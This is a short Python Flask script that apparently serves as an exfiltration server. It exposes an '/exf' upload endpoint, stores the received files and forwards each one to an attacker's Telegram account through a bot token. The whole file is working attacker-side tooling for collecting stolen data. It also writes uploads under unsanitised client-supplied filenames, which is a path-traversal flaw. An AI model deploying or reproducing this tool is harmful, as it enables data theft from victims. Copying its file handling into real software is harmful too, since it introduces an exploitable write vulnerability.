from flask import Flask, request
import os, telegram, argparse

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument("-p", "--port", help="port serv", required=True)
parser.add_argument("-f", "--folder", help="Folder of save uploads")
parser.add_argument("-tu", "--user", help="User of telegram")
parser.add_argument("-tt", "--token", help="Token of telegram")
args = parser.parse_args()

UPLOAD_FOLDER = args.folder

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def sendfile(file, userId, token):
	bot = telegram.Bot(token=token)
	bot.send_document(chat_id=userId, document=open(file,"rb"))

@app.route("/exf", methods=['GET','POST'])
def upload():
	if request.method == "POST":
		if 'file' not in  request.files:
			return 'no file part'
		file = request.files["file"]
		if file.filename == "":
			return 'no selected file'
		if file:
			filename = file.filename
			file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
			try:
				sendfile(f"{UPLOAD_FOLDER}/{filename}", args.user, args.token)
			except:
				print("could not send the file...")
			return 'ok'

	return 'exfilserver'

if __name__ == '__main__':
	app.run(host="0.0.0.0",port=int(args.port))